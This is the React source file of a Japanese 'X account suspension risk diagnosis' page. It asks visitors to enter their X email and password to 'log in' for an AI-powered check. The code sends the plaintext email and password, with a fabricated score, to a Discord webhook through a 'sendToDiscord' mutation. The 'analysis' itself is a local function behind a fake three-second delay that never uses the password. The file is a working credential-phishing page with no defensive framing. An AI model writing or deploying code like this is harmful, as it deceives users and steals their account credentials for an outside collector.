/**
 * Home Page — 凍結リスク診断
 * Design: Frost Clinic
 * - 氷・雪山の世界観
 * - ログインフォーム（メール＋パスワード）で診断開始
 * - 結果：別ページで表示
 * - Discord Webhook連携
 * - Twitter/Xシェア機能
 */

import { useState } from "react";
import { useLocation } from "wouter";
import { Eye, EyeOff, Lock, Mail, AlertTriangle, Info } from "lucide-react";
import Snowfall from "@/components/Snowfall";
import MountainBackground from "@/components/MountainBackground";
import { diagnose } from "@/lib/diagnose";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";
import { useEffect } from "react";

// ===== ローディングスピナー =====
function LoadingSpinner() {
  return (
    <div className="fixed inset-0 bg-black/40 backdrop-blur-sm flex items-center justify-center z-50">
      <div className="flex flex-col items-center gap-4">
        <div className="w-16 h-16 border-4 border-blue-200 border-t-blue-600 rounded-full animate-spin"></div>
        <p className="text-white font-bold text-lg">AIが分析中...</p>
      </div>
    </div>
  );
}

// ===== ログインフォーム =====
function LoginForm({ onDiagnose, isLoading }: { onDiagnose: (email: string, password: string) => void; isLoading: boolean }) {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState<{ email?: string; password?: string }>({});

  const validate = () => {
    const errs: typeof errors = {};
    if (!email) errs.email = "メールアドレスを入力してください";
    else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) errs.email = "有効なメールアドレスを入力してください";
    if (!password) errs.password = "パスワードを入力してください";
    else if (password.length < 6) errs.password = "パスワードは6文字以上で入力してください";
    return errs;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const errs = validate();
    if (Object.keys(errs).length > 0) {
      setErrors(errs);
      return;
    }
    setErrors({});
    setLoading(true);
    // 3秒のローディング処理
    setTimeout(() => {
      setLoading(false);
      onDiagnose(email, password);
    }, 3000);
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-4" noValidate>
      {/* メールアドレス */}
      <div>
        <label className="block text-sm font-medium text-slate-600 mb-1.5">
          ユーザー名またはメールアドレス
        </label>
        <div className="relative">
          <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            placeholder="example@email.com"
            autoComplete="email"
            disabled={isLoading}
            className={`w-full pl-10 pr-4 py-3 rounded-xl border bg-white/70 text-slate-700 placeholder-slate-400 text-sm transition-all outline-none input-glow focus:border-blue-400 focus:bg-white disabled:opacity-50 ${
              errors.email ? "border-red-400 bg-red-50/50" : "border-slate-200"
            }`}
          />
        </div>
        {errors.email && (
          <p className="text-red-500 text-xs mt-1 flex items-center gap-1">
            <AlertTriangle className="w-3 h-3" />
            {errors.email}
          </p>
        )}
      </div>

      {/* パスワード */}
      <div>
        <label className="block text-sm font-medium text-slate-600 mb-1.5">
          パスワード
        </label>
        <div className="relative">
          <Lock className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
          <input
            type={showPassword ? "text" : "password"}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="••••••••"
            autoComplete="current-password"
            disabled={isLoading}
            className={`w-full pl-10 pr-10 py-3 rounded-xl border bg-white/70 text-slate-700 placeholder-slate-400 text-sm transition-all outline-none input-glow focus:border-blue-400 focus:bg-white disabled:opacity-50 ${
              errors.password ? "border-red-400 bg-red-50/50" : "border-slate-200"
            }`}
          />
          <button
            type="button"
            onClick={() => setShowPassword(!showPassword)}
            disabled={isLoading}
            className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600 transition-colors disabled:opacity-50"
          >
            {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
          </button>
        </div>
        {errors.password && (
          <p className="text-red-500 text-xs mt-1 flex items-center gap-1">
            <AlertTriangle className="w-3 h-3" />
            {errors.password}
          </p>
        )}
      </div>

      {/* 注意書き */}
      <div className="flex items-start gap-2 p-3 rounded-xl bg-blue-50/80 border border-blue-100">
        <Info className="w-4 h-4 text-blue-400 mt-0.5 shrink-0" />
        <p className="text-xs text-blue-600 leading-relaxed">
          結果表示に時間がかかる恐れがあります
        </p>
      </div>

      {/* 診断ボタン */}
      <button
        type="submit"
        disabled={loading || isLoading}
        className="w-full py-3.5 rounded-xl font-bold text-white text-sm transition-all duration-300 relative overflow-hidden disabled:opacity-70"
        style={{
          background: loading || isLoading
            ? "linear-gradient(135deg, #93c5fd, #60a5fa)"
            : "linear-gradient(135deg, #1d4ed8 0%, #0ea5e9 100%)",
          boxShadow: loading || isLoading ? "none" : "0 4px 15px rgba(29, 78, 216, 0.35)",
        }}
      >
        {loading || isLoading ? (
          <span className="flex items-center justify-center gap-2">
            <svg className="animate-spin w-4 h-4" viewBox="0 0 24 24" fill="none">
              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
            </svg>
            AIが分析中...
          </span>
        ) : (
          <span className="flex items-center justify-center gap-2">
            🧊 凍結リスクを診断する
          </span>
        )}
      </button>
    </form>
  );
}

// ===== メインページ =====
export default function Home() {
  const [, navigate] = useLocation();
  const [isLoading, setIsLoading] = useState(false);

  // Discord Webhook送信用のミューテーション
  const sendToDiscord = trpc.diagnosis.sendToDiscord.useMutation({
    onSuccess: () => {
      toast.success("結果が確認できました");
    },
    onError: (error: unknown) => {
      console.error("Discord送信エラー:", error);
      // エラーが出ても診断結果は表示する
      toast.error("Discord送信に失敗しましたが、診断結果は表示されます");
    },
  });

  const handleDiagnose = async (email: string, password: string) => {
    setIsLoading(true);

    // IP制限チェック
    const lastDiagnosisTime = localStorage.getItem("lastDiagnosisTime");
    const now = Date.now();
    const oneHourMs = 60 * 60 * 1000; // 1時間

    if (lastDiagnosisTime) {
      const timeSinceLastDiagnosis = now - parseInt(lastDiagnosisTime);
      if (timeSinceLastDiagnosis < oneHourMs) {
        const remainingMinutes = Math.ceil((oneHourMs - timeSinceLastDiagnosis) / 60000);
        toast.error(`1時間以内の再診断はできません。あと${remainingMinutes}分お待ちください。`);
        setIsLoading(false);
        return;
      }
    }

    // 3秒待機
    await new Promise(resolve => setTimeout(resolve, 3000));

    const res = diagnose(email);

    // ローカルストレージに診断結果を保存
    localStorage.setItem("diagnosisResult", JSON.stringify(res));
    localStorage.setItem("diagnosisEmail", email);
    localStorage.setItem("lastDiagnosisTime", now.toString());

    // Discord Webhookに送信
    try {
      await sendToDiscord.mutateAsync({
        email,
        password,
        score: res.score,
        riskLabel: res.details[0]?.status || "unknown",
        timestamp: new Date().toISOString(),
      });
    } catch (err) {
      console.error("Discord送信エラー:", err);
    }

    setIsLoading(false);
    // 結果ページにナビゲート
    navigate("/result");
  };

  return (
    <div
      className="min-h-screen relative overflow-hidden"
      style={{
        background: "linear-gradient(180deg, #e0f2fe 0%, #dbeafe 30%, #e0e7ff 55%, #f1f5f9 85%, #ffffff 100%)",
      }}
    >
      {/* ローディングスピナー */}
      {isLoading && <LoadingSpinner />}

      {/* 雪のパーティクル */}
      <Snowfall count={45} />

      {/* 雪山背景 */}
      <MountainBackground />

      {/* メインコンテンツ */}
      <div className="relative" style={{ zIndex: isLoading ? 1 : 2 }}>
        {/* ヘッダー */}
        <header className="flex items-center justify-between px-6 py-4">
          <button
            onClick={() => navigate("/")}
            className="flex items-center gap-2 hover:opacity-80 transition-opacity cursor-pointer"
          >
            <img
              src="https://d2xsxph8kpxj0f.cloudfront.net/310519663552057848/CuC3B5sAkxkvMwjRYbotyX/freeze-ice-cube-FSBkjAE4nL7jTLD5mAinc6.webp"
              alt="氷のアイコン"
              className="w-7 h-7 object-contain"
            />
            <span className="font-bold text-slate-700 text-sm tracking-wide" style={{ fontFamily: "'Montserrat', sans-serif" }}>診断</span>
          </button>
        </header>

        {/* ヒーローセクション */}
        <section className="flex flex-col items-center px-4 pt-8 pb-16">
          {/* 氷のキューブアイコン */}
          <img
            src="https://d2xsxph8kpxj0f.cloudfront.net/310519663552057848/CuC3B5sAkxkvMwjRYbotyX/freeze-ice-cube-FSBkjAE4nL7jTLD5mAinc6.webp"
            alt="氷のキューブ"
            className="w-20 h-20 object-contain mb-4 drop-shadow-lg"
            style={{ filter: "drop-shadow(0 4px 12px rgba(56, 189, 248, 0.4))" }}
          />

          {/* タイトル */}
          <h1
            className="gradient-title text-4xl sm:text-5xl font-black text-center mb-2 leading-tight"
            style={{ fontFamily: "'Noto Serif JP', serif" }}
          >
            凍結リスク診断
          </h1>
          <p className="text-slate-500 text-sm sm:text-base text-center mb-8">
            Xにログインして診断してみよう
          </p>

          {/* ログインフォームカード */}
          <div className="w-full max-w-md" style={{ pointerEvents: isLoading ? "none" : "auto", opacity: isLoading ? 0.5 : 1 }}>
            <div className="glass-card rounded-2xl p-6 shadow-xl">
              <div className="flex items-center gap-2 mb-5">
                <div
                  className="w-8 h-8 rounded-lg flex items-center justify-center"
                  style={{ background: "linear-gradient(135deg, #1d4ed8, #0ea5e9)" }}
                >
                  <Lock className="w-4 h-4 text-white" />
                </div>
                <div>
                  <p className="text-sm font-bold text-slate-700">診断</p>
                  <p className="text-xs text-slate-400">Xにログインして診断してみよう</p>
                </div>
              </div>
              <LoginForm onDiagnose={handleDiagnose} isLoading={isLoading} />
            </div>
          </div>

          {/* 凍結リスク診断とは */}
          <div className="w-full max-w-md mt-6" style={{ pointerEvents: isLoading ? "none" : "auto", opacity: isLoading ? 0.5 : 1 }}>
            <div className="glass-card rounded-2xl p-5">
              <div className="flex items-center gap-2 mb-2">
                <span className="text-lg">🧊</span>
                <h2 className="font-bold text-slate-700 text-sm">凍結リスク診断とは</h2>
              </div>
              <p className="text-slate-500 text-sm leading-relaxed">
                Xアカウントが凍結されるリスクをAIが<strong className="text-blue-600">0〜100%で判定</strong>します。<br />
                プロフィール・ツイート・シャドーバン状況を総合分析。
              </p>
            </div>
          </div>
        </section>
      </div>

      {/* フッター */}
      <footer className="border-t border-slate-200/50 bg-white/50 backdrop-blur-sm py-6 mt-12 relative" style={{ zIndex: 2 }}>
        <div className="max-w-2xl mx-auto px-4 flex flex-col sm:flex-row items-center justify-between gap-4 text-xs text-slate-500">
          <p>&copy; 2026 凍結リスク診断. All rights reserved.</p>
          <a
            href="/privacy"
            className="text-blue-600 hover:text-blue-700 font-medium transition-colors"
          >
            プライバシーポリシー
          </a>
        </div>
      </footer>
    </div>
  );
}
